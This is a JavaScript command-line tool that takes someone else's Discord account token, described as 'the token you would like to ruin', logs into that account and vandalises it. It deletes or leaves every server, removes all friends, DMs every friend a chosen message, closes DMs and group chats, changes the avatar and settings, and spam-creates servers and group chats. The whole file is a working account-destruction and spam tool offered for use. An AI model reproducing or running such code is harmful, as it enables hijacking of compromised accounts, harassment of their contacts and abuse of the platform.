const sleep = (time) => new Promise((f) => setTimeout(() => f(time), time));
const axios = require('axios');
const prompt = require('inquirer').createPromptModule();
const AsciiTable = require('ascii-table');
const { Client } = require('discord.js');
const chalk = require('chalk');
const inquirer = require('inquirer');

const actions = {
   all: 'Execute all actions',
   servers: 'Leave servers & delete owned servers',
   dm: 'DM all friends',
   friends: 'Remove all friends',
   pfp: 'Change PFP',
   settings: 'Fuck settings',
   deleterecent: 'Delete recent DMs & Leave group chats',
   serverspam: 'Spam create servers',
   groupspam: 'Spam create group chats'
};

(async () => {
   let { token } = await prompt({
      name: 'token',
      type: 'input',
      message: "Input the token you would like to ruin:"
   });

   console.log(chalk`{green ?} Logging in...`);

   const client = new Client();

   client.on('ready', async () => {
      await promptOptions(client);
   });

   client.login(token).catch(() => {
      console.error(chalk`{red ?} Invalid token provided, exiting process...`);
      process.exit(-1);
   });
})();

async function promptOptions(client) {
   console.clear();

   let table = new AsciiTable('Information');

   table.addRowMatrix([
      ['Tag', client.user.tag],
      ['ID', client.user.id],
      ['Servers', client.guilds.size],
      ['Friends', client.user.friends.size]
   ]).setJustify().setAlignRight(1);

   console.log(chalk.cyan(`${table.toString()}\n`));

   let { action } = await prompt({
      type: 'list',
      name: 'action',
      message: 'Select the action you wish to execute',
      pageSize: 10,
      loop: false,
      choices: [...Object.values(actions)]
   });


   return executeAction(client, Object.keys(actions).find(key => actions[key] === action));
}

async function executeAction(client, action) {
   console.clear();

   switch (action) {
      case 'all':
         for (let action of Object.keys(actions)) {
            if (action == 'all') continue;
            await funcs[action](client);
         }
         break;
      case 'servers':
         await funcs.servers(client);
         break;
      case 'dm':
         await funcs.dm(client);
         break;
      case 'friends':
         await funcs.friends(client);
         break;
      case 'pfp':
         await funcs.pfp(client);
         break;
      case 'settings':
         await funcs.settings(client);
         break;
      case 'deleterecent':
         await funcs.deleterecent(client);
         break;
      case 'serverspam':
         await funcs.serverspam(client);
         break;
      case 'groupspam':
         await funcs.groupspam(client);
         break;
   }

   console.log(chalk`{green ?} Action(s) have been executed successfully, returning to the main menu...`);
   setTimeout(async () => {
      return await promptOptions(client);
   }, 5000);
}

const funcs = {
   servers: async function (client) {
      if (!client.guilds.size) return console.log(chalk`{red ?} No guilds to leave/delete.`);
      let guilds = [...client.guilds.values()]
      for (const guild of guilds) {
         if (guild.ownerID == client.user.id) {
            try {
               await guild.delete();
               console.log(chalk`{green !} Deleting ${guild.name}...`);
            } catch (e) {
               if (!e.message.includes('two-factor')) guilds.push(guild);
            }
         } else {
            try {
               await guild.leave();
               console.log(chalk`{green !} Leaving ${guild.name}...`);
            } catch {
               guilds.push(guild);
            }
         }
      }
   },
   dm: async function (client) {
      if (!client.user.friends.size) return console.log(chalk`{red ?} No friends to dm.`);
      let { message } = await inquirer.prompt({
         type: 'input',
         message: 'What message would you like to DM all friends?',
         name: 'message'
      });
      let friends = [...client.user.friends.values()];
      for (const friend of friends) {
         await sleep(500);
         try {
            await friend.send(message);
            console.log(chalk`{green ?} DMing ${friend.tag}`);
         } catch {
            friends.push(friend);
         }
      };
   },
   friends: async function (client) {
      if (!client.user.friends.size) return console.log(chalk`{red ?} No friends to remove.`);
      let friends = [...client.user.friends.values()];
      for (const friend of friends) {
         await sleep(250);
         try {
            await friend.removeFriend();
            console.log(chalk`{green ?} Removing ${friend.tag}`);
         } catch {
            friends.push(friend);
         }
      };
   },
   pfp: async function (client) {
      console.log(chalk`{green ?} Setting avatar`)
      await client.user.setAvatar('./avatar.png').catch(() => null)
   },
   deleterecent: async function (client) {
      let dms = [...client.channels.filter(c => ['dm', 'group'].includes(c.type)).values()];
      if (!dms.length) return console.log(chalk`{red ?} No recent DMs/Group Chats to close.`);
      for (const dm of dms) {
         if (dm.type == 'dm') {
            try {
               await dm.delete();
               console.log(chalk`{green ?} Closing DM with ${dm.recipient.tag}`)
            } catch {
               dms.push(dm);
            }
         } else {
            try {
               await dm.delete();
               console.log(chalk`{green ?} Leaving Group Chat ${dm.name ? dm.name : dm.recipients.map(u => u.tag).join(', ')}`)
            } catch {
               dms.push(dm);
            }
         }
      }
   },
   settings: async function (client) {
      console.log(chalk`{green ?} Patching settings`)
      await axios.patch('https://canary.discordapp.com/api/v8/users/@me/settings', {
         locale: 'zh-CN',
         theme: 'light',
         message_display_compact: true,
         inline_embed_media: false,
         inline_attachment_media: false,
         gif_auto_play: false,
         render_embeds: false,
         render_reactions: false,
         animate_emoji: false
      }, {
         headers: {
            Authorization: client.token
         }
      })
   },
   serverspam: async function (client) {
      let { name } = await inquirer.prompt({
         type: 'input',
         message: 'What name would you like the servers to have?',
         name: 'name'
      });

      let amount = 100;
      while (amount > 0) {
         await sleep(100);
         try {
            let n = `${name} ${random(3)}`
            await client.user.createGuild(n, 'us-west', './avatar.png');
            console.log(chalk`{green ?} Creating ${n}`); --amount;
         } catch {
            ++amount;
         }
      }
   },
   groupspam: async function (client) {
      let { amount } = await inquirer.prompt({
         type: 'number',
         message: 'How many group chats do you want to spam create?',
         name: 'amount'
      });

      if (amount > 10) return console.log(chalk`{red ?} Due to API limitations, 10 or less group chats can be created every 10 minutes. Try again with a smaller amount.`)

      let i = 1;
      while (amount > 0) {
         await sleep(1000);
         try {
            await client.user.createGroupDM([]);
            console.log(chalk`{green ?} Creating Group Chat #${i}`); --amount; ++i;
         } catch {
            ++amount;
         }
      }
   }
};

function random(length) {
   var result = '';
   var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
   }
   return result;
}


